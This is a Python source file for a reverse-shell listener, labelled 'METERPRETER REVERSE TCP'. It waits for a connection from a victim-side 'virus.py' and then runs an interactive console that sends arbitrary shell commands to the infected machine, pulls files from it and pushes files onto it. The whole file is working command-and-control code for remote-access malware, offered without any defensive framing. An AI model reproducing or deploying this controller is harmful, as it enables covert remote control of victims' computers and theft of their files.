import socket                                                                   # ABHIJTIH K A
import os                                                                       # METERPRETER REVERSE TCP
                                                                                # 19 AUG 2017
os.system("cls")

s = socket.socket()

host = "192.168.1.105"    # Replace host with the ip of this machine

port = 5555               # Replace port number with the port given in 'virus.py' also port forward it in router

s.bind((host, port))

s.listen(1)

print("Listening on port ==> ", port)

c, addr = s.accept()

os.system("cls")

print("Meterpreter session opened ==> ", addr, "at port ", port)

print("Type 'help' or '?' for command list")

while True:

    command = str(input(">>"))

    # Handle 'exit' command

    if command == "exit":

        c.send(command.encode())

        c.close()

        print("Session closed.")

        break

    # Handle 'shell' command

    elif command == "shell":

        c.send(command.encode())

        if c.recv(1024).decode() == "shellX":

            while True:

                com = str(input("(Shell)>>"))

                if com == "exit":

                    c.send(com.encode())

                    break

                else:

                    c.send(com.encode())

                    print(c.recv(1024).decode())

    # Handle 'download' command

    elif command[0:8] == "download" and command[8:9] == " " and len(command.split(" ")) == 3:

        if command.split(" ")[2] == " " or command.split(" ")[1] == " ":

            print("[-] The syntax of the command is incorrect.")

        else:

            file = command.split(" ")[1]

            destination = command.split(" ")[2]

            if os.path.exists(destination) and destination.endswith("/"):

                c.send(command.encode())

                res = c.recv(1024)

                if str(res.decode())[:3] == "ERR":

                    print("[-] The file '" + command.split(" ")[1] + "' not found")

                else:

                    filesize = int(res.decode()[6:])

                    download = open(os.getcwd() + "/new_" + file, "wb")

                    data = c.recv(1024)

                    total = len(data)

                    download.write(data)

                    while total < filesize:

                        data = c.recv(1024)

                        total += len(data)

                        download.write(data)

                    download.close()

                    if os.path.exists(destination + "new_" + file):

                        print("[?] The destination already contains a file with same name.\nDo you want to replace it? ('y' for yes)")

                        ans = str(input("Ans:-"))

                        if ans == "y" or ans == "Y":

                            os.remove(destination + "new_" + file)

                            os.rename(os.getcwd() + "/new_" + file, destination + "new_" + file)

                            print("[+] The file '" + command.split(" ")[ 1] + "' is downloaded ===> " + destination + "new_" + file)

                        else:

                            os.remove(os.getcwd() + "/new_" + file)

                            print("[-] The file is not downloaded")

                    else:

                        os.rename(os.getcwd() + "/new_" + file, destination + "new_" + file)

                        print("[+] The file '" + command.split(" ")[1] + "' is downloaded ===> " + destination + "new_" + file)

            else:

                print("[-] The destination is not valid")

    elif command[0:6] == "upload" and command[6:7] == " " and len(command.split(" ")) == 3:

        if command.split(" ")[1] == " " or command.split(" ")[2] == " " or not command.split(" ")[2].endswith("/"):

            print("[-] The syntax of the command is incorrect")

        else:

            if os.path.isfile(command.split(" ")[1]):

                c.send(command.encode())

                if c.recv(1024).decode() != "ERR":

                    size = str(os.path.getsize(command.split(" ")[1]))

                    c.send(size.encode())

                    file = open(command.split(" ")[1], "rb")

                    data = file.read(1024)

                    c.send(data)

                    while data != b"":

                        data = file.read(1024)

                        c.send(data)

                    file.close()

                    print(c.recv(1024).decode())

                else:

                    print("[-] The upload destination is invalid!")

            else:

                print("[-] The specified file doesn't exists.")

    # Handle other commands and invalid commands

    else:

        c.send(command.encode())

        print(c.recv(1024).decode())
